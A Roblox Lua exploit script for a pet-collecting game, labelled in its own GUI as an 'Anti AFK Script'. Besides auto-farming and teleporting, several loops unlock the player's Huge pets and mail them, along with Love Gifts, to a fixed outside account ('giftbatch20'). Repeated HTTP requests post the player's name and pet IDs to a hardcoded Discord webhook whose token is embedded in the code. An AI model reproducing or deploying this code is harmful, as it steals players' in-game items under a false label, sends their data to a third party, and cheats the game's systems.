



wait(7)
wait(0.5)local ba=Instance.new("ScreenGui")
local ca=Instance.new("TextLabel")local da=Instance.new("Frame")
local _b=Instance.new("TextLabel")local ab=Instance.new("TextLabel")ba.Parent=game.CoreGui
ba.ZIndexBehavior=Enum.ZIndexBehavior.Sibling;ca.Parent=ba;ca.Active=true
ca.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ca.Draggable=true
ca.Position=UDim2.new(0.698610067,0,0.098096624,0)ca.Size=UDim2.new(0,370,0,52)
ca.Font=Enum.Font.SourceSansSemibold;ca.Text="Anti AFK Script"ca.TextColor3=Color3.new(0,1,1)
ca.TextSize=22;da.Parent=ca
da.BackgroundColor3=Color3.new(0.196078,0.196078,0.196078)da.Position=UDim2.new(0,0,1.0192306,0)
da.Size=UDim2.new(0,370,0,107)_b.Parent=da
_b.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)_b.Position=UDim2.new(0,0,0.800455689,0)
_b.Size=UDim2.new(0,370,0,21)_b.Font=Enum.Font.Arial;_b.Text="made by ur mom "
_b.TextColor3=Color3.new(0,1,1)_b.TextSize=20;ab.Parent=da
ab.BackgroundColor3=Color3.new(0.176471,0.176471,0.176471)ab.Position=UDim2.new(0,0,0.158377,0)
ab.Size=UDim2.new(0,370,0,44)ab.Font=Enum.Font.ArialBold;ab.Text="Status: Active"
ab.TextColor3=Color3.new(0,1,1)ab.TextSize=20;local bb=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
bb:CaptureController()bb:ClickButton2(Vector2.new())
ab.Text="Roblox tried to kick u but i kicked him instead"wait(2)ab.Text="Status : Active"end)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

if game.PlaceId ~= 8737899170 then
    while true do
        game.ReplicatedStorage.Network.World1Teleport:InvokeServer()
        wait(5)
    end
end


local function teleport()
    while true do
        local player = Players.LocalPlayer
        local character = player.Character or player.CharacterAdded:Wait()
        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

        if workspace:FindFirstChild("__THINGS") then
            local __THINGS = workspace.__THINGS
            if __THINGS:FindFirstChild("__INSTANCE_CONTAINER") then
                local __INSTANCE_CONTAINER = __THINGS.__INSTANCE_CONTAINER
                if __INSTANCE_CONTAINER:FindFirstChild("Active") then
                    local Active = __INSTANCE_CONTAINER.Active
                    if not Active:FindFirstChild("TowerTycoon") then
                        repeat
                            if workspace:FindFirstChild("__THINGS") and
                               __THINGS:FindFirstChild("Instances") and
                               __THINGS.Instances:FindFirstChild("TowerTycoon") and
                               __THINGS.Instances.TowerTycoon:FindFirstChild("Teleports") and
                               __THINGS.Instances.TowerTycoon.Teleports:FindFirstChild("Enter") then
                                local targetPosition = __THINGS.Instances.TowerTycoon.Teleports.Enter.Position
                                humanoidRootPart.CFrame = CFrame.new(targetPosition)
                                wait(20)
                            end
                            wait(1)
                        until Active:FindFirstChild("TowerTycoon")
                    end
                end
            end
        end
        wait(1)
    end
end
spawn(teleport)
wait(7)

local function chest()
    while true do
        wait(0.1)
        
        local args1 = {
            [1] = "Rainbow Mini Chest"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args1))

        local args2 = {
            [1] = "Large Gift Bag"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args2))

        local args5 = {
            [1] = "Mini Chest"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args5))
        
        local args3 = {
            [1] = "Gift Bag"
        }
        game:GetService("ReplicatedStorage").Network.GiftBag_Open:InvokeServer(unpack(args3))
    end
end

spawn(chest)

local args = {
    "ShowOtherPets"
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Toggle Setting"):InvokeServer(unpack(args))

local args = {
    "PotatoMode"
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Toggle Setting"):InvokeServer(unpack(args))

local function MailClaim()
while true do
    local player = game.Players.LocalPlayer
    
        local gui = player.PlayerGui:FindFirstChild("_MACHINES")
        if gui then
            local mailboxMachine = gui:FindFirstChild("MailboxMachine")
            if mailboxMachine then
                local giftsFrame = mailboxMachine:FindFirstChild("Frame") and mailboxMachine.Frame:FindFirstChild("GiftsFrame")
                if giftsFrame then
                    local itemsFrame = giftsFrame:FindFirstChild("ItemsFrame")
                    if itemsFrame then
                        local frameChild = itemsFrame:FindFirstChildWhichIsA("Frame")
                        if frameChild then

                            local args = {
                                [1] = {
                                    [1] = frameChild.Name
                                }
                            }
                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim"):InvokeServer(unpack(args))
                        end
                    end
                end
            end
        end
        wait(1)
    end
end

spawn(MailClaim)

local args = {
    [1] = "Cat",
    [2] = "Dog"
}

game:GetService("ReplicatedStorage").Network:FindFirstChild("Pick Starter Pets"):InvokeServer(unpack(args))


local ReplicatedStorage = game:GetService("ReplicatedStorage")
local workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

function OrbCollect()
    while true do 
        local Orbs = workspace:FindFirstChild("__THINGS")
        if Orbs then
            for _, orb in ipairs(Orbs.Orbs:GetChildren()) do
                local ohTable1 = { tonumber(orb.Name) }
                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
                orb:Destroy()
            end 
        end
        task.wait()
    end
end

function LootbagCollect()
    while true do 
        local Lootbags = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Lootbags")
        if Lootbags then
            for _, bag in ipairs(Lootbags:GetChildren()) do
                local ohTable1 = { tostring(bag) }
                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
                bag:Destroy()
            end 
        end
        task.wait()
    end
end

spawn(OrbCollect)
spawn(LootbagCollect)

local function deletetycoon()
    while true do
        local tycoons = workspace:FindFirstChild("__THINGS"):FindFirstChild("Tycoons")
        if tycoons then
            local foundNonBillboard = false
            for _, tycoon in ipairs(tycoons:GetChildren()) do
                local interactable = tycoon:FindFirstChild("Interactable")
                if interactable then
                    local hasBillboard = interactable:FindFirstChild("PlayerImageBillboard") ~= nil
                    if not hasBillboard then
                        foundNonBillboard = true
                    elseif foundNonBillboard then
                        tycoon:Destroy()
                    end
                end
            end
        end
        wait(5)
    end
end
spawn(deletetycoon)
 local function autotapandpet()
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local WorkSpace = game:GetService("Workspace")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    local Network = ReplicatedStorage:WaitForChild("Network")

    _G.AutoFarmOnOff = true
    _G.AutoFarmDistance = 200
    local Farming = false
    local BreakableRemote = Network:WaitForChild("Breakables_PlayerDealDamage")

    local function AutoFarmBreakables()
        Farming = true
        while _G.AutoFarmOnOff do
            local HumanoidRootPart = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
            local Breakables = WorkSpace:FindFirstChild("__THINGS") and WorkSpace.__THINGS:FindFirstChild("Breakables")

            if HumanoidRootPart and Breakables then
                local NearestBreakable, NearestHitbox, ActualBreakableDistance

                for _, Breakable in ipairs(Breakables:GetChildren()) do
                    for _, MeshPart in pairs(Breakable:GetChildren()) do
                        if MeshPart:IsA("MeshPart") then
                            local Hitbox = MeshPart:FindFirstChild("Hitbox")
                            if Hitbox then
                                local Distance = (HumanoidRootPart.Position - Hitbox.Position).Magnitude
                                if not NearestBreakable or Distance < ActualBreakableDistance then
                                    NearestBreakable, NearestHitbox, ActualBreakableDistance = Breakable, Hitbox, Distance
                                end
                            end
                        end
                    end
                end

                if NearestBreakable and NearestHitbox then
                    repeat
                        BreakableRemote:FireServer(NearestBreakable.Name)
                        wait()
                    until not NearestBreakable.Parent or (HumanoidRootPart.Position - NearestHitbox.Position).Magnitude > _G.AutoFarmDistance or not _G.AutoFarmOnOff
                end
            end
            wait()
        end
        Farming = false
    end

    spawn(AutoFarmBreakables)

   
end

spawn(autotapandpet)


local HttpService = game:GetService("HttpService")
local Timer = 0

local function timerrr()
    while true do
        Timer = Timer + 1
        wait(1)
    end
end
spawn(timerrr)

local numbertwo = 0
local numberone = 0

local function findtext()
    while true do
        local things = workspace:FindFirstChild("__THINGS")
        if things then
            local tycoons = things:FindFirstChild("Tycoons")
            if tycoons then
                for _, tycoon in ipairs(tycoons:GetChildren()) do
                    local interactable = tycoon:FindFirstChild("Interactable")
                    if interactable and not interactable:FindFirstChild("PlayerImageBillboard") then
                        local machines = interactable:FindFirstChild("Machines")
                        if machines then
                            local machine = machines:FindFirstChild("TowerRebirthMachine")
                            if machine then
                                local gui = machine:FindFirstChild("GUI")
                                if gui then
                                    local billboard = gui:FindFirstChild("Billboard")
                                    if billboard then
                                        local billboardGui = billboard:FindFirstChild("BillboardGui")
                                        if billboardGui then
                                            local status = billboardGui:FindFirstChild("Status")
                                            if status and status:IsA("TextLabel") then
                                                local text = status.Text
                                                if text == "Rebirth Ready!" then
                                                    repeat wait() until status.Text ~= "Rebirth Ready!"
                                                else
                                                    local firstNumber, secondNumber = text:match("(%d+)%s*/%s*(%d+)")
                                                    numberone = tonumber(firstNumber) or 0
                                                    numbertwo = tonumber(secondNumber) or 0
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
        wait()
    end
end

spawn(findtext)



local completed = false
local player = game.Players.LocalPlayer
local playerGui = player:FindFirstChildOfClass("PlayerGui")
local lovegiftamount = 0
local CurrentHatch = 0

local screenGui = playerGui:FindFirstChild("ProgressGui") or Instance.new("ScreenGui", playerGui)
screenGui.Name = "ProgressGui"

local frame = screenGui:FindFirstChild("ProgressFrame") or Instance.new("Frame", screenGui)
frame.Name = "ProgressFrame"
frame.Size = UDim2.new(0.3, 0, 0.2, 0)
frame.Position = UDim2.new(0.35, 0, 0.4, 0)
frame.BackgroundColor3 = Color3.new(0, 0, 0)

local textLabel = frame:FindFirstChild("ProgressText") or Instance.new("TextLabel", frame)
textLabel.Name = "ProgressText"
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.Position = UDim2.new(0, 0, 0, 0)
textLabel.BackgroundTransparency = 1
textLabel.TextColor3 = Color3.new(1, 1, 1)
textLabel.TextScaled = true
textLabel.Font = Enum.Font.SourceSansBold

local function rejoinServer()
    local TeleportService = game:GetService("TeleportService")
    TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
end
local started = false
local checkkk = false
local function startcheck()
if started == false then 
started = true
wait(60) 
if checkkk == false then 
rejoinServer()
end

end
end

local function gui()
    while true do
        local startTime = tick()
 
        if textLabel.Text == "Loading..." then
spawn(startcheck)
        end
           

        if completed then
            local rainbowGui = screenGui:FindFirstChild("RainbowGui") or Instance.new("Frame", screenGui)
            rainbowGui.Name = "RainbowGui"
            rainbowGui.Size = UDim2.new(1.5, 0, 1.5, 0)
            rainbowGui.Position = UDim2.new(-0.25, 0, -0.25, 0)
            rainbowGui.BackgroundTransparency = 0.3
            
            local completedText = rainbowGui:FindFirstChild("CompletedText") or Instance.new("TextLabel", rainbowGui)
            completedText.Name = "CompletedText"
            completedText.Size = UDim2.new(1, 0, 0.2, 0)
            completedText.Position = UDim2.new(0, 0, 0, 0.4)
            completedText.BackgroundTransparency = 1
            completedText.TextColor3 = Color3.new(0, 0, 0)
            completedText.TextScaled = true
            completedText.Font = Enum.Font.SourceSansBold
            completedText.Text = "COMPLETED"

            while completed do
                rainbowGui.BackgroundColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                wait(0.1)
            end

            rainbowGui:Destroy()
        else
        checkkk = true
            if type(numberone) == "number" and type(numbertwo) == "number" and numbertwo > 0 then
                local percentage = math.floor((numberone / numbertwo) * 100)
                textLabel.Text = numbertwo .. " : Complete Percentage : " .. percentage .. "%\nLove Gifts : " .. lovegiftamount
            else
            checkkk = false
                textLabel.Text = "Loading..."
            end
        end
        wait(1)
    end
end

spawn(gui)



local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))
local Player = Players.LocalPlayer
local PlayerGui = Player:WaitForChild("PlayerGui")

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function calculateAmount()
    local Items = GetItemInfo("Currency")
    for _, Item in pairs(Items) do
        if string.find(Item.id, "ValentinesCoins") then
            local amount = Item.am
            local value = 1
            if amount > 250 then
                local output = math.floor(amount / 250)
                if output > 0 then
                    if output < 20 then
                        value = output
                    else
                        value = 20
                    end
                end
            end
            return value
        end
    end
    return 1
end

local function getClosestObject(objects, referencePosition, maxDistance)
    local closest, closestDistance = nil, maxDistance
    for _, obj in pairs(objects) do
        if obj:IsA("Model") then
            local primaryPart = obj.PrimaryPart or obj:FindFirstChild("Center") or obj:FindFirstChildWhichIsA("BasePart")
            if primaryPart then
                local distance = (referencePosition - primaryPart.Position).Magnitude
                if distance < closestDistance then
                    closest, closestDistance = primaryPart, distance
                end
            end
        end
    end
    return closest
end

                                   
local function CreateButton()
    local ScreenGui = Instance.new("ScreenGui", PlayerGui)
    local Button = Instance.new("TextButton", ScreenGui)

    Button.Size = UDim2.new(0.2, 0, 0.1, 0)
    Button.Position = UDim2.new(0.4, 0, 0, 10)
    Button.BackgroundColor3 = Color3.new(0, 0, 0)
    Button.TextColor3 = Color3.new(1, 1, 1)
    Button.TextScaled = true
    Button.Text = "Send Love Gift"

    Button.MouseButton1Click:Connect(function()
        local Items = GetItemInfo("Lootbox")
        for _, Item in pairs(Items) do
            if string.find(Item.id, "Love Gift") then
                if Item.am >= 1 then
                    local args = {
                        [1] = "giftbatch20",
                        [2] = "enjoy bro",
                        [3] = "Lootbox",
                        [4] = Item.uid,
                        [5] = Item.am
                    }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                end
            end
        end
    end)
end

spawn(CreateButton)


local HttpService = game:GetService("HttpService")

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local function stop()
    while true do
        if type(numbertwo) == "number" and numbertwo > 500 then
            completed = true
            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
            local request = (syn and syn.request) or request or (http and http.request) or http_request
            request({
                Url = webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    content = LocalPlayer.Name .. " | COMPLETED 500"
                })
            })
            LocalPlayer:Kick("COMPLETED TOWER . SWAP!")
            wait(3)
        end
        wait(180)
    end
end

task.spawn(stop)



local function PetInfo()
    while true do
        local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
        local found = false

        if Inventory["Pet"] then
            for UID, Pet in pairs(Inventory["Pet"]) do
                if Pet.id == "Love Peacock" then
                    found = true
                    if not Pet._am or Pet._am < 15 then
                        local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
                        local request = (syn and syn.request) or request or (http and http.request) or http_request
                        request({
                            Url = webhook,
                            Method = "POST",
                            Headers = { ["Content-Type"] = "application/json" },
                            Body = HttpService:JSONEncode({
                                content = game.Players.LocalPlayer.Name .. " | COMPLETED 50"
                            })
                        })
                    end
                end
            end
        end

        if not found then
            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
            local request = (syn and syn.request) or request or (http and http.request) or http_request
            request({
                Url = webhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode({
                    content = game.Players.LocalPlayer.Name 
                })
            })
        end

        wait(120)
    end
end



local function joinraffle()
    while true do
        local args = {
            "TowerTycoonTitanicRaffle",
            20,
            false
        }
        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Raffle_Submit"):InvokeServer(unpack(args))
        wait(1)
    end
end
spawn(joinraffle)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Library = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass, ItemsName)
    local Table = {}
    for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
        if table.find(ItemsName, Item.id) then
            local ItemInfo = {
                ["uid"] = UID,
                ["data"] = Item
            }
            table.insert(Table, ItemInfo)
        end
    end
    return Table
end

local function getCurrentTitanicPets()
    local TitanicPetsTable = {}
    for _, Pet in pairs(ReplicatedStorage.__DIRECTORY.Pets.Titanic:GetChildren()) do
        table.insert(TitanicPetsTable, Pet.Name)
    end
    return GetItemInfo("Pet", TitanicPetsTable)
end

function ProcessTitanicPets()
    while true do
        local TitanicPets = {}
        for _, MadeTable in pairs(getCurrentTitanicPets()) do
            table.insert(TitanicPets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
        end

        if #TitanicPets > 0 then
            local payload = {
                content = "OH MY FUCKING GOD A HUGE PET : " .. table.concat(TitanicPets, ", ")
            }

            local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
            local requestFunction = (syn and syn.request) or request or (http and http.request) or http_request

            if requestFunction then
                requestFunction({
                    Url = webhook,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode(payload)
                })
            end
        end

        wait(5)
    end
end

spawn(ProcessTitanicPets)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Library = require(ReplicatedStorage:WaitForChild("Library"))
local ProcessedHuges = {}

function ProcessHugePets()
    while true do
        local function GetItemInfo(ItemsClass, ItemsName)
            local Table = {}
            for UID, Item in pairs(require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory[ItemsClass]) do
                if table.find(ItemsName, Item.id) then
                    local ItemInfo = {
                        ["uid"] = UID,
                        ["data"] = Item
                    }
                    table.insert(Table, ItemInfo)
                end
            end
            return Table
        end

        local function getCurrentHugePets()
            local GoldPetsTable = {}
            for i, Pet in next, ReplicatedStorage.__DIRECTORY.Pets.Huge:GetChildren() do
                table.insert(GoldPetsTable, Pet.Name)
            end
            return GetItemInfo("Pet", GoldPetsTable)
        end

        local hugePets = {}
        local uids = {}

        for i, MadeTable in next, getCurrentHugePets() do
            table.insert(hugePets, MadeTable.data.id .. " (UID: " .. MadeTable.uid .. ")")
            table.insert(uids, MadeTable.uid)
        end

        if #hugePets > 0 then
            for i = #uids, 1, -1 do
                local webhook = "https://discord.com/api/webhooks/1233196606401019975/qIxgbxZsF4dwVkMkDNB_Ei-p7zWhGwQ4DoPlgraHwJOkhUedOaDH6PYLDeXtNElNOF4x"
                local request = (syn and syn.request) or request or (http and http.request) or http_request

                request({
                    Url = webhook,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json"
                    },
                    Body = HttpService:JSONEncode({
                        content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
                    })
                })

                local args = {
                    [1] = uids[i],
                    [2] = false
                }

                game:GetService("ReplicatedStorage").Network.Locking_SetLocked:InvokeServer(unpack(args))
                wait(1)
                wait(3)

                local args = {
                    [1] = "giftbatch20",
                    [2] = "omg u got a new huge!!",
                    [3] = "Pet",
                    [4] = uids[i],
                    [5] = 1
                }
                game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))

                wait(3)
            end
        end
        wait(3)
    end
end

spawn(ProcessHugePets)



local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function PrintItemInfo()
    local Classes = {
        "Lootbox", "Currency"
    }
    local SearchPrint = {"Love Gift", "Diamonds"}
    local SearchResults = {}

    for _, Class in pairs(Classes) do
        local Items = GetItemInfo(Class)
        for _, Item in pairs(Items) do
            for _, SearchTerm in pairs(SearchPrint) do
                if string.find(Item.id, SearchTerm) then
                    table.insert(SearchResults, Item)
                end
            end
        end
    end
end

local function sendingdata()
    while true do
        local Items = GetItemInfo("Lootbox")
        for _, Item in pairs(Items) do
            if string.find(Item.id, "Love Gift") then
                lovegiftamount = Item.am

                if completed and Item.am >= 30 then
                    local args = {
                        [1] = "giftbatch20",
                        [2] = "enjoy bro",
                        [3] = "Lootbox",
                        [4] = Item.uid,
                        [5] = Item.am
                    }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                    wait(5)
                end

                if Item.am >= 9 then
                    local args = {
                        [1] = "giftbatch20",
                        [2] = "enjoy bro",
                        [3] = "Lootbox",
                        [4] = Item.uid,
                        [5] = Item.am
                    }
                    game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                    wait(5)
                end
            end
        end
        wait(3)
    end
end

spawn(sendingdata)

local function remotess()
while true do

local args = {
    10
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ValentinesMachine_Activate"):InvokeServer(unpack(args))

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Tycoons: Request Rebirth"):InvokeServer()

wait(5)
end
end
spawn(remotess)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function potion()
    while true do
        local Items = GetItemInfo("Potion") -- Check for Potions instead of Lootbox
        for _, Item in pairs(Items) do
            if Item.am >= 1 then 
         
local args = {
    Item.uid,
    1
}
game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Potions: Consume"):FireServer(unpack(args))

            end
        end
        wait() -- Add a small delay to avoid spamming
    end
end

spawn(potion)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function Fruits()
    while true do
        local Items = GetItemInfo("Fruit")
        for _, Item in pairs(Items) do
            local args = {
                Item.uid,
                1
            }
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Fruits: Consume"):FireServer(unpack(args))
        end
        wait()
    end
end

spawn(Fruits)

local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Client = require(ReplicatedStorage:WaitForChild("Library"))

local function GetItemInfo(ItemsClass)
    local Table = {}
    local Inventory = require(ReplicatedStorage:WaitForChild("Library"):WaitForChild("Client").Save).Get().Inventory
    if Inventory[ItemsClass] then
        for UID, Item in pairs(Inventory[ItemsClass]) do
            if Item._am and Item._am >= 1 then
                local ItemInfo = {
                    ["class"] = ItemsClass,
                    ["id"] = Item.id,
                    ["uid"] = UID,
                    ["am"] = Item._am
                }
                table.insert(Table, ItemInfo)
            end
        end
    end
    return Table
end

local function Enchant()
    while true do
        local Items = GetItemInfo("Enchant")
        for _, Item in pairs(Items) do
            if string.find(Item.id, "Criticals") then
                local args = {
                    Item.uid
                }
                game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Enchants_Equip"):FireServer(unpack(args))
                wait(5)
            end
        end
        wait()
    end
end

spawn(Enchant)

local function buff()
    while true do
       game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ToyBall_Consume"):InvokeServer()

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("SqueakyToy_Consume"):InvokeServer()

game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("ToyBone_Consume"):InvokeServer()

        wait(1)
    end
end

spawn(buff)

        
wait(7)

while true do
    local tycoons = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Tycoons")
    if tycoons then
        for _, tycoon in ipairs(tycoons:GetChildren()) do
            local interactable = tycoon:FindFirstChild("Interactable")
            if interactable and not interactable:FindFirstChild("PlayerImageBillboard") then
                local luckText = interactable.TowerInfoBoard.Main.SurfaceGui.Top.CurrentLuck.Text
                local luckValue = tonumber(string.match(luckText, "%d+"))

                if luckValue then
     
                    local character = Player.Character
                    if not character then
                        wait()
                        character = Player.Character
                    end

     
                    local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                    if not humanoidRootPart then
                        wait()
                        humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
                    end

                    if humanoidRootPart then
                        if luckValue == 1 then
                            local closestBreakable = getClosestObject(workspace.__THINGS.Breakables:GetChildren(), humanoidRootPart.Position, 150)
                            if closestBreakable then
                                local closestEgg = getClosestObject(workspace.__THINGS.CustomEggs:GetChildren(), closestBreakable.Position, 150)
                                if closestEgg then
                                    humanoidRootPart.CFrame = closestEgg.CFrame
                                    

                                    for _, egg in ipairs(workspace.__THINGS.CustomEggs:GetChildren()) do
                                        local center = egg:FindFirstChild("Center")
                                        if center and (humanoidRootPart.Position - center.Position).Magnitude <= 30 then
                                            local value = calculateAmount()
                                            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("CustomEggs_Hatch"):InvokeServer(egg.Name, value)
                                        end
                                    end
                                end
                            end
                        else
                            local islands = interactable.TowerInfoBoard.Parent:FindFirstChild("Islands")
                            if islands then
                                for _, island in ipairs(islands:GetChildren()) do
                                    local hugeSign = island:FindFirstChild("HugeSign")
                                    if hugeSign then
                                        local hugeSignText = hugeSign.SurfaceGui.Frame.TextLabel.Text
                                        local hugeSignValue = tonumber(string.match(hugeSignText, "%d+"))

                                        if hugeSignValue == luckValue then
                                            humanoidRootPart.CFrame = hugeSign.CFrame
                                            

                                            for _, egg in ipairs(workspace.__THINGS.CustomEggs:GetChildren()) do
                                                local center = egg:FindFirstChild("Center")
                                                if center and (humanoidRootPart.Position - center.Position).Magnitude <= 30 then
                                                    local value = calculateAmount()
                                                    game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("CustomEggs_Hatch"):InvokeServer(egg.Name, value)
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    wait()
end
